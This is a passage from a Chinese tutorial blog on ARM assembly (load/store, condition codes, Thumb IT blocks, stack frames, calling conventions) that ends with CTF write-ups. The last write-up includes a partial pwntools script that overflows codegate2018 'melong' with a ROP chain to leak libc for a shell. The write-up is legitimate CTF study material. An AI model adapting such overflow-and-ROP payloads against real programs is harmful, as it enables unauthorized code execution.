</span></span></code></pre></td></tr></table></div></div><p><strong>避免方法</strong></p><ol><li>使用小数字构建大数字，如：不使用<code>MOV r0, #511</code>，而是使用<code>MOV r0, #256, and ADD r0, #255</code></li><li>使用<code>LDR r1, =511</code>，让编译器替你转换成mov指令或者PC偏移加载。</li></ol><h3 id=load-store-多个>LOAD STORE 多个</h3><p><code>LDM</code>, <code>STM</code>，有后缀<code>-IA</code>（Increase After）, <code>IB</code>（Increase Before）, <code>DA</code>（Decrease After）, <code>DB</code>（Decrease Before）。</p><p><code>LDM</code> 相当于 <code>LDMIA</code></p><p>示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ldm r0, {r4,r5}    /* 分别读取R0，R0+4地址处的数据到R4，R5 */
</span></span><span class=line><span class=cl>stm r0, {r4,r5}    /* 将R4，R5存储到R0，R0+4地址处
</span></span><span class=line><span class=cl>ldmib r0, {r4-r6}  /* 分别读取R0+4, R0+8, R0+12地址处的数据到R4, R5, R6 */
</span></span><span class=line><span class=cl>stmib r1, {r4-r6}  /* 同理 */
</span></span><span class=line><span class=cl>ldmda r0, {r4-r6}  /* 分别读取R0-8, R0-4, R0地址处的数据到R4, R5, R6。数字大的寄存器对应高地址数据*/
</span></span><span class=line><span class=cl>ldmdb r0, {r4-r6}  /* 同理 */
</span></span><span class=line><span class=cl>stmda r2, {r4-r6}  /* 将R4, R5, R6分别存储到R2-8, R2-4, R2地址处
</span></span></code></pre></td></tr></table></div></div><h4 id=push-pop>push pop</h4><p><code>push</code>：sp-4, store</p><p><code>pop</code>：load，sp+4</p><p><code>push {r0,r1}</code>相当于<code>stmdb sp!, {r0,r1}</code></p><p><code>pop {r2, r3}</code>相当于<code>ldria sp!, {r2,r3}</code></p><h3 id=条件执行与分支>条件执行与分支</h3><h4 id=条件执行>条件执行</h4><table><thead><tr><th style=text-align:center>Condition Code</th><th style=text-align:left>Meaning (for cmp or subs)</th><th style=text-align:center>Status of Flags</th></tr></thead><tbody><tr><td style=text-align:center>EQ</td><td style=text-align:left>Equal</td><td style=text-align:center>Z==1</td></tr><tr><td style=text-align:center>NE</td><td style=text-align:left>Not Equal</td><td style=text-align:center>Z==0</td></tr><tr><td style=text-align:center>GT</td><td style=text-align:left>Signed Greater Than</td><td style=text-align:center>(Z==0) && (N==V)</td></tr><tr><td style=text-align:center>LT</td><td style=text-align:left>Signed Less Than</td><td style=text-align:center>N!=V</td></tr><tr><td style=text-align:center>GE</td><td style=text-align:left>Signed Greater Than or Equal</td><td style=text-align:center>N==V</td></tr><tr><td style=text-align:center>LE</td><td style=text-align:left>Signed Less Than or Equal</td><td style=text-align:center>(Z==1) || (N!=V)</td></tr><tr><td style=text-align:center>CS or HS</td><td style=text-align:left>Unsigned Higher or Same (or Carry Set)</td><td style=text-align:center>C==1</td></tr><tr><td style=text-align:center>CC or LO</td><td style=text-align:left>Unsigned Lower (or Carry Clear)</td><td style=text-align:center>C==0</td></tr><tr><td style=text-align:center>MI</td><td style=text-align:left>Negative (or Minus)</td><td style=text-align:center>N==1</td></tr><tr><td style=text-align:center>PL</td><td style=text-align:left>Positive (or Plus)</td><td style=text-align:center>N==0</td></tr><tr><td style=text-align:center>AL</td><td style=text-align:left>Always executed</td><td style=text-align:center>–</td></tr><tr><td style=text-align:center>NV</td><td style=text-align:left>Never executed</td><td style=text-align:center>–</td></tr><tr><td style=text-align:center>VS</td><td style=text-align:left>Signed Overflow</td><td style=text-align:center>V==1</td></tr><tr><td style=text-align:center>VC</td><td style=text-align:left>No signed Overflow</td><td style=text-align:center>V==0</td></tr><tr><td style=text-align:center>HI</td><td style=text-align:left>Unsigned Higher</td><td style=text-align:center>(C==1) && (Z==0)</td></tr><tr><td style=text-align:center>LS</td><td style=text-align:left>Unsigned Lower or same</td><td style=text-align:center>(C==0) || (Z==0)</td></tr></tbody></table><h4 id=thumb中的条件执行>Thumb中的条件执行</h4><p>Thumb-2有条件执行指令<code>IT</code>，其最多允许4条指令。</p><ul><li>IT refers to If-Then (next instruction is conditional)</li><li>ITT refers to If-Then-Then (next 2 instructions are conditional)</li><li>ITE refers to If-Then-Else (next 2 instructions are conditional)</li><li>ITTE refers to If-Then-Then-Else (next 3 instructions are conditional)</li><li>ITTEE refers to If-Then-Then-Else-Else (next 4 instructions are conditional)</li></ul><p>其实就是if&ndash;else语句，else的逻辑必须与if<strong>相反</strong>。if成立执行一条或两条指令，else成立就执行else一条或两条指令。示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ITTE   NE           ; Next 3 instructions are conditional
</span></span><span class=line><span class=cl>ANDNE  R0, R0, R1   ; ANDNE does not update condition flags
</span></span><span class=line><span class=cl>ADDSNE R2, R2, #1   ; ADDSNE updates condition flags
</span></span><span class=line><span class=cl>MOVEQ  R2, R3       ; Conditional move
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ITE    GT           ; Next 2 instructions are conditional
</span></span><span class=line><span class=cl>ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true
</span></span><span class=line><span class=cl>ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ITTEE  EQ           ; Next 4 instructions are conditional
</span></span><span class=line><span class=cl>MOVEQ  R0, R1       ; Conditional MOV
</span></span><span class=line><span class=cl>ADDEQ  R2, R2, #10  ; Conditional ADD
</span></span><span class=line><span class=cl>ANDNE  R3, R3, #1   ; Conditional AND
</span></span><span class=line><span class=cl>BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block
</span></span></code></pre></td></tr></table></div></div><p>相反的条件：</p><table><thead><tr><th style=text-align:center>Condition Code</th><th style=text-align:center>Opposite</th><th style=text-align:center></th><th style=text-align:center></th></tr></thead><tbody><tr><td style=text-align:center>Code</td><td style=text-align:center>Meaning</td><td style=text-align:center>Code</td><td style=text-align:center>Meaning</td></tr><tr><td style=text-align:center>EQ</td><td style=text-align:center>Equal</td><td style=text-align:center>NE</td><td style=text-align:center>Not Equal</td></tr><tr><td style=text-align:center>HS (or CS)</td><td style=text-align:center>Unsigned higher or same (or carry set)</td><td style=text-align:center>LO (or CC)</td><td style=text-align:center>Unsigned lower (or carry clear)</td></tr><tr><td style=text-align:center>MI</td><td style=text-align:center>Negative</td><td style=text-align:center>PL</td><td style=text-align:center>Positive or Zero</td></tr><tr><td style=text-align:center>VS</td><td style=text-align:center>Signed Overflow</td><td style=text-align:center>VC</td><td style=text-align:center>No Signed Overflow</td></tr><tr><td style=text-align:center>HI</td><td style=text-align:center>Unsigned Higher</td><td style=text-align:center>LS</td><td style=text-align:center>Unsigned Lower or Same</td></tr><tr><td style=text-align:center>GE</td><td style=text-align:center>Signed Greater Than or Equal</td><td style=text-align:center>LT</td><td style=text-align:center>Signed Less Than</td></tr><tr><td style=text-align:center>GT</td><td style=text-align:center>Signed Greater Than</td><td style=text-align:center>LE</td><td style=text-align:center>Signed Less Than or Equal</td></tr><tr><td style=text-align:center>AL (or omitted)</td><td style=text-align:center>Always Executed</td><td style=text-align:center>There is no opposite to AL</td><td style=text-align:center></td></tr></tbody></table><h4 id=bblbxblx>B/BL/BX/BLX</h4><p>L: link</p><p>X: Exchange</p><ul><li>B，就是普通的跳转</li><li>BL，跳转并且把PC+4存储到LR寄存器。（实际调试发现，这里的PC不是+8之后的，存储的返回地址</li><li>BX，BLX，<code>X</code>就是转换ARM/THUMB模式的意思</li></ul><p>示例：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.text
</span></span><span class=line><span class=cl>.global _start
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>_start:
</span></span><span class=line><span class=cl>     .code 32         @ ARM mode
</span></span><span class=line><span class=cl>     add r2, pc, #1   @ put PC+1 into R2，此时实际PC指向mov r0,r1指令开始处（PC+8），所以bx可以直接跳过去
</span></span><span class=line><span class=cl>     bx r2            @ branch + exchange to R2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    .code 16          @ Thumb mode
</span></span><span class=line><span class=cl>     mov r0, #1
</span></span></code></pre></td></tr></table></div></div><h4 id=条件分支>条件分支</h4><p>给分支加上条件，如：<code>BEQ</code></p><h3 id=栈和函数>栈和函数</h3><h4 id=栈>栈</h4><p>栈的类型：full ascending, full descending, empty ascending, empty descending</p><p>full/empty：sp指向是否有数据</p><p>ascending/descending：栈长的方向</p><p>ARM是full descending</p><h4 id=函数>函数</h4><p><strong>prologue</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>push   {r11, lr}    /* Start of the prologue. Saving Frame Pointer and LR onto the stack */
</span></span><span class=line><span class=cl>add    r11, sp, #0  /* Setting up the bottom of the stack frame */
</span></span><span class=line><span class=cl>sub    sp, sp, #16  /* End of the prologue. Allocating some buffer on the stack. This also allocates space for the Stack Frame */
</span></span></code></pre></td></tr></table></div></div><p>保存前一个R11和程序返回地址。（BL指令，跳转向指定地址，并将返回地址存储于lr，由被调用者保存lr）</p><p>保存栈帧</p><p>创建函数所需栈空间</p><p><strong>body</strong></p><p>函数逻辑</p><p><strong>epilogue</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sub    sp, r11, #0  /* Start of the epilogue. Readjusting the Stack Pointer */
</span></span><span class=line><span class=cl>pop    {r11, pc}    /* End of the epilogue. Restoring Frame Pointer from the Stack, jumping to previously saved LR via direct load into PC. The Stack Frame of a function is finally destroyed at this step. */
</span></span></code></pre></td></tr></table></div></div><p>恢复SP，取出r11和返回地址。</p><h4 id=叶子函数与非叶子函数>叶子函数与非叶子函数</h4><p>叶子函数：函数中不会再调用其他函数</p><p>非叶子函数：相反。</p><p>叶子函数因为不会再调用，LR寄存器不会再改变，所以不必保存LR寄存器。叶子函数的最后使用<code>bx lr</code>跳转回去就可以。</p><p><code>bx</code>在地址最低位设置为1的情况下才会进行ARM/THUMB模式的转换，否则不会改变只是跳转。</p><h3 id=aarch64>aarch64</h3><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p><table><thead><tr><th style=text-align:center>寄存器</th><th style=text-align:center>别名</th><th style=text-align:center>意义</th></tr></thead><tbody><tr><td style=text-align:center>SP</td><td style=text-align:center>–</td><td style=text-align:center>Stack Pointer:栈指针</td></tr><tr><td style=text-align:center>R30</td><td style=text-align:center>LR</td><td style=text-align:center>Link Register:在调用函数时候，保存下一条要执行指令的地址。</td></tr><tr><td style=text-align:center>R29</td><td style=text-align:center>FP</td><td style=text-align:center>Frame Pointer:保存函数栈的基地址。</td></tr><tr><td style=text-align:center>R19-R28</td><td style=text-align:center>–</td><td style=text-align:center>Callee-saved registers（含义见上面术语解释）</td></tr><tr><td style=text-align:center>R18</td><td style=text-align:center>–</td><td style=text-align:center>平台寄存器，有特定平台解释其用法。</td></tr><tr><td style=text-align:center>R17</td><td style=text-align:center>IP1</td><td style=text-align:center>The second intra-procedure-call temporary register……</td></tr><tr><td style=text-align:center>R16</td><td style=text-align:center>IP0</td><td style=text-align:center>The first intra-procedure-call temporary register……</td></tr><tr><td style=text-align:center>R9-R15</td><td style=text-align:center>–</td><td style=text-align:center>临时寄存器</td></tr><tr><td style=text-align:center>R8</td><td style=text-align:center>–</td><td style=text-align:center>在一些情况下，返回值是通过R8返回的</td></tr><tr><td style=text-align:center>R0-R7</td><td style=text-align:center>–</td><td style=text-align:center>在函数调用过程中传递参数和返回值</td></tr><tr><td style=text-align:center>NZCV</td><td style=text-align:center>–</td><td style=text-align:center>状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td></tr></tbody></table><h2 id=arm函数调用约定>ARM函数调用约定</h2><p>ARM/ARM64使用的是AAPCS或ATPCS标准。</p><p>ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。</p><p>而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。</p><p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中。</p><p><img src=https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png alt="arm call convention"></p><h2 id=例题>例题</h2><h3 id=pwnablekr-leg>pwnable.kr leg</h3><p>该题目就是考察PC预取两条指令。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key1
</span></span><span class=line><span class=cl>Dump of assembler code for function key1:
</span></span><span class=line><span class=cl>   0x00008cd4 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008cdc &lt;+8&gt;:	mov	r3, pc
</span></span><span class=line><span class=cl>   0x00008ce0 &lt;+12&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008cec &lt;+24&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span></code></pre></td></tr></table></div></div><p>key1函数将当前的PC读入R3，R3会被移入R0，当作返回值。如上所示，当前PC是<code>0x00008cdc+8</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key2
</span></span><span class=line><span class=cl>Dump of assembler code for function key2:
</span></span><span class=line><span class=cl>   0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1
</span></span><span class=line><span class=cl>   0x00008d00 &lt;+16&gt;:	bx	r6
</span></span><span class=line><span class=cl>   0x00008d04 &lt;+20&gt;:	mov	r3, pc
</span></span><span class=line><span class=cl>   0x00008d06 &lt;+22&gt;:	adds	r3, #4
</span></span><span class=line><span class=cl>   0x00008d08 &lt;+24&gt;:	push	{r3}
</span></span><span class=line><span class=cl>   0x00008d0a &lt;+26&gt;:	pop	{pc}
</span></span><span class=line><span class=cl>   0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d10 &lt;+32&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d1c &lt;+44&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span></code></pre></td></tr></table></div></div><p>key2函数变换了一下ARM/THUMB模式，THUMB中指令长度是2字节，预取两条指令就是+4。这个函数也是R3中的值当作返回值。</p><p>在THUMB模式中将PC（0x00008d04+4）移入R3，然后R3又加了4。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key3
</span></span><span class=line><span class=cl>Dump of assembler code for function key3:
</span></span><span class=line><span class=cl>   0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008d28 &lt;+8&gt;:	mov	r3, lr
</span></span><span class=line><span class=cl>   0x00008d2c &lt;+12&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d38 &lt;+24&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span></code></pre></td></tr></table></div></div><p>key3将lr（返回地址）读入r3。找到main函数中调用key3函数的位置，+4即为返回地址。</p><h3 id=codegate2018-melong>codegate2018 melong</h3><p>这个执行文件中，用了很多浮点库函数，加减乘除和浮点比较等等，所以看起来有点抽象。</p><p>漏洞点在PT中的size，输入一个无法malloc的大小，就能绕过检查。</p><p>write_diary使用size的低字节作为输入长度，存在溢出。</p><p>多次运行程序可以发现，libc加载地址没有变化，所以可以第一次泄露libc，第二次getshell。</p><p>我从<a href=https://m4x.fun/post/how-2-pwn-an-arm-binary/#codegate2018---melong>m4x</a>师傅那里看到一个方法，但不明白是如何返回的main函数。。。</p><blockquote><p>2020-10-18更新</p><p>先前LR中所存储的地址是某个函数调用留下的，第一次ROP puts执行完毕，回到了这个地址，pop了PC。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./melong&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>localfile</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Type the number:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your height(meters) : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your weight(kilograms) : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>PT</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Type the number:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;How long do you want to take personal training?</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_diary</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Type the number:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Type the number:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># gadgets</span>
</span></span><span class=line><span class=cl><span class=c1># 0x00011bbc : pop {r0, pc}</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>g1</span> <span class=o>=</span> <span class=mh>0x00011bbc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>check</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;&#34;&#34;b *0x11288</span>
</span></span><span class=line><span class=cl>    <span class=c1># b *0x1118C</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;&#34;&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>PT</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x54</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>g1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;main&#34;</span><span class=p>])</span><span class=o>*</span><span class=mi>6</span>
</span></span><span class=line><span class=cl>    <span class=n>write_diary</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;See you again :)</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;puts_addr&#34;</span><span class=p>,</span> <span class=n>puts_addr</span><span class=p>)</span>
